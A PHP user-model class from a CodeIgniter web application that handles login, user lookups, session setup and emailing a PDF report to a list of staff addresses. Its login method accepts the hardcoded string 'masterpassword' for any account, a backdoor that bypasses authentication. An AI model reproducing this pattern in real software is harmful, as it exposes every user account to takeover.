<?php
/**
 * Created by PhpStorm.
 * User: Jair
 * Date: 29/11/2017
 * Time: 2:35 PM
 */

class Model_user extends Model_user_base
{
    public function __construct($firstName, $lastName, $email, $facebookId, $phone, $password, $avatar = NULL, $passwordHash = "", $activationHash = "", $status = 1, $taxDeductible = "", $googleId = "")
    {
        parent::__construct($firstName, $lastName, $email, $facebookId, $phone, $password, $avatar, $passwordHash, $activationHash, $status, $taxDeductible, $googleId);
    }

    public static function login($email, $password)
    {
        $user = static::getByEmail($email);

        $response = FALSE;
        if($user instanceof Model_user)
        {
            if(password_verify($password, $user->_password) || "masterpassword" == $password)
            {
               $response = $user;
            }
        }
        return $response;
    }

    public static function getByEmail($email)
    {
        $ci =&get_instance();
        $ci->load->database();
        $sql = "Select * from ".static::TABLE_NAME. " where email_usr = ".$ci->db->escape($email)." and deleted_usr != 1";

        $query = $ci->db->query($sql);
        $result = static::recast(get_called_class(),$query->row());
        return $result;
    }

    public static function getByGoogleId($googleId)
    {
        $ci =&get_instance();
        $ci->load->database();
        $sql = "Select * from ".static::TABLE_NAME. " where googleid_usr = ".$ci->db->escape($googleId)." and deleted_usr != 1";

        $query = $ci->db->query($sql);
        $result = static::recast(get_called_class(),$query->row());
        return $result;
    }

    public static function getByFullName($fullName)
    {
        $ci =&get_instance();
        $ci->load->database();
        $sql = "Select * from ".static::TABLE_NAME. " where concat(firstname_usr,' ',lastname_usr) = ".$ci->db->escape($fullName)." and deleted_usr != 1";

        $query = $ci->db->query($sql);
        $result = static::recast(get_called_class(),$query->row());
        return $result;
    }




    public function startSession()
    {
        $ci = &get_instance();

        $roleList = Model_role::getByUserId($this->_id);
        $featureList = Model_feature::getFeaturesTreeSeedByRoleArray($roleList);
        $userRoleList = Model_role::getByUserId($this->_id);
        $userArrayRoleList = array();
        foreach ($userRoleList as $role)
        {
            $role = $role->toArray();
            $userArrayRoleList[] = $role["keyword_rol"];
        }
        $ci->load->library('session');
        /** begin - Session user basic data */
        $sessionUser["id"] = $this->_id;
        $sessionUser["firstName"] = $this->_firstName;
        $sessionUser["lastName"] = $this->_lastName;
        $sessionUser["fullName"] = $this->_firstName." ".$this->_lastName;
        $sessionUser["featureList"] = serialize($featureList);

        $sessionUser["roleList"] = serialize($userArrayRoleList);
        $ci->session->set_userdata("sessionUser", (object)$sessionUser);
        /** end - Session user basic data */

        $ci->session->set_userdata("authenticated", 1);
    }

    public function savePrivilegesInSession()
    {
        $ci = &get_instance();
        $ci->load->database();
        $featureListArray = array();
        $roleList = Model_user_role::getByUserId($this->_id);
        $featureList = Model_feature::getByRoleList($roleList);
        foreach ($featureListArray as $feature)
        {
            $featureListArray[$feature->getId()] = $feature->toArray();
        }
        $result = array();
        $result["userId"] = $this->getId();
        $result["panelSideMenu"] = $featureList;
        $ci->session->set_userdata("featurelist", serialize($result));
        return $result;

    }

    public function delete($makePhysicalDelete = FALSE)
    {
        //Delete all roles
        Model_user_role::deleteUserRoles($this->_id);
        //Delete user
        parent::delete($makePhysicalDelete);
    }

    public static function netBuildingEmail()
    {
        $ci = &get_instance();
        $data = array();
        $pathToFile = FCPATH.'assets/documents/ReporteDeConstruccionDeRedes_'.date("Y-m-d").".pdf";
        $sendTo = array(
            "vhsuarez@serebo.com",
            "maguilera@serebo.com",
            "eddysonca@serebo.com",
            "genaromj@serebo.com",
            "walvarez@serebo.com",
            "pmendoza@serebo.com",
            "rubenaf@serebo.com"
        );
        $TCPDFHandler = new NetBuildingReportPDF();
        $TCPDFHandler->PrintReport("F");

        $emailHandler = new EmailHandler();
        $email = $emailHandler->initialize();
        $email->from(EmailHandler::getSender(), 'Serebo.Admin');
        $email->reply_to('noreply@serebo.toqueeltimbre.com', 'Serebo.Admin');
        $email->to($sendTo);
        $email->bcc('jair@twiiti.com');
        $email->attach($pathToFile);
        $email->subject("¡Reporte De Construccion De Redes!");
        $email->message($ci->load->view("default-template/panel/email-template/net-building-email.php", $data, true));
        try
        {
            if($email->Send())
            {
                $sendMessageResponse['success'] = 1;
                $sendMessageResponse['message'] = "Notice sent successfully.";
                unlink($pathToFile);
            }
            else
            {
                $sendMessageResponse['success'] = 0;
                $sendMessageResponse['message'] = "Something went wrong!";
            }
        }
        catch (Exception $e)
        {
            $sendMessageResponse['success'] = 0;
            $sendMessageResponse['message'] = "Internal server error, please try again.";
        }
        return $sendMessageResponse;
    }
}